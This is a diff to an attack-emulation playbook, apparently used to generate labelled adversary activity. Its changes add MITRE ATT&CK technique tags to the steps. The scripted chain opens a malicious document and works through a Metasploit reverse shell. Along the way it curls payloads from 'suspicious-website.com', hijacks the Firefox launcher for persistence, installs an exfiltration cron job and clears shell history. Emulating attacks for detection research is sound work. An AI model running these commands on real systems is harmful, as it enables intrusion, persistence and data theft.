@@ -132,9 +132,10 @@ commands:
     input: "soffice /home/judy/Nutzungshinweise.odt"
     session: client
     metadata:
-      techniques: "T1204"
+      techniques: "T1204.002"
       tactics: "Execution"
-
+      technique_name: "User Execution: Malicious File"
+      
   - type: sleep
     seconds: 1
 
@@ -142,6 +143,10 @@ commands:
     cmd: key
     key: "enter"
     session: client
+    metadata:
+      techniques: "T1204.002"
+      tactics: "Execution"
+      technique_name: "User Execution: Malicious File"
 
   - type: sleep
     seconds: 3
@@ -152,11 +157,19 @@ commands:
     stdapi: true
     session: revshell
     cmd: sysinfo
+    metadata:
+      techniques: "T1082"
+      tactics: "Discovery"
+      technique_name: "System Information Discovery"
 
   # upload cronjob that extracts data
   - type: msf-session
     session: revshell
     cmd: upload downloader.txt
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
 
 ################### ATTACKER GATHERS INFORMATION ############################
 
@@ -164,27 +177,51 @@ commands:
   - type: msf-session
     cmd: shell
     session: revshell
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
 
   - type: msf-session
     cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
     session: revshell
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
  
   - type: msf-session
     cmd: export SHELL=bash
     session: revshell
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
  
   - type: msf-session
     cmd: export TERM=xterm256-color
     session: revshell
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
 
   - type: msf-session
     cmd: stty rows 38 columns 116
     session: revshell
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
 
   # needed for xclip and wmctrl
   - type: msf-session
     cmd: export DISPLAY=:0
     session: revshell
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
 
 ################### PERSISTENCE OPTION A, BROWSER BINARY ############################
 
@@ -192,16 +229,28 @@ commands:
   - type: msf-session
     cmd: curl -o /home/judy/.local/share/firefox/firefox-startup suspicious-website.com:8083/index
     session: revshell
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
 
   # replace the symlink
   - type: msf-session
     session: revshell
     cmd: ln -sf /home/judy/.local/share/firefox/firefox-startup /home/judy/.local/bin/firefox
+    metadata:
+      techniques: "T1574.008,T1546" 
+      tactics: "Persistence,Defense Evasion"
+      technique_name: "Hijack Execution Flow: Path Interception by Search Order Hijacking,Event Triggered Execution"
 
   # make it executable
   - type: msf-session
     session: revshell
     cmd: chmod +x /home/judy/.local/share/firefox/firefox-startup
+    metadata:
+      techniques: "T1222.002"
+      tactics: "Defense Evasion" # Modifying permissions enables the evasion/persistence technique
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification"
 
 ################### ATTACKER GATHERS INFORMATION ############################
 
@@ -209,7 +258,11 @@ commands:
   - type: msf-session
     cmd: curl -o /home/judy/.local/bin/veiltransfer_client_linux suspicious-website.com:8082/index
     session: revshell
-    
+    metadata:
+      techniques: "T1105,T1048.001"
+      tactics: "Command and Control,Exfiltration"
+      technique_name: "Ingress Tool Transfer,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+
   # get the last clipboard entry
   - type: msf-session
     session: revshell
@@ -223,21 +276,28 @@ commands:
   - type: msf-session
     session: revshell
     cmd: cp /tmp/index /home/judy/.index
+    metadata:
+      techniques: "T1564.001"
+      tactics: "Defense Evasion"
+      technique_name: "T1564.001 Hidden Files and Directories"
 
   # make the veiltransfer client binary executable
   - type: msf-session
     session: revshell
     cmd: chmod +x /home/judy/.local/bin/veiltransfer_client_linux 
+    metadata:
+      techniques: "T1222.002,T1048.001"
+      tactics: "Defense Evasion,Exfiltration"
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
 
   # add the cronjob to extract data
   - type: msf-session
     session: revshell
     cmd: (crontab -l; cat /home/judy/downloader.txt) | crontab -
     metadata:
-      techniques: "T1029"
-      tactics: "Exfiltration"
-      technique_name: "Scheduled Transfer"
-
+      techniques: "T1029,T1053.003,T1048.001"
+      tactics: "Persistence, Execution,Exfiltration"
+      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
   # find out which windown are open
   - type: msf-session
     session: revshell
@@ -252,9 +312,9 @@ commands:
     session: revshell
     cmd: history -c
     metadata:
-      techniques: "T1565.001"
-      tactics: "Defensive Evasion"
-      technique_name: "Data Manipulation: Stored Data Manipulation"
+      techniques: "T1070.003"
+      tactics: "Defense Evasion"
+      technique_name: "Indicator Removal: Clear Command History"
 
   # exit the interactive shell
   - type: msf-session
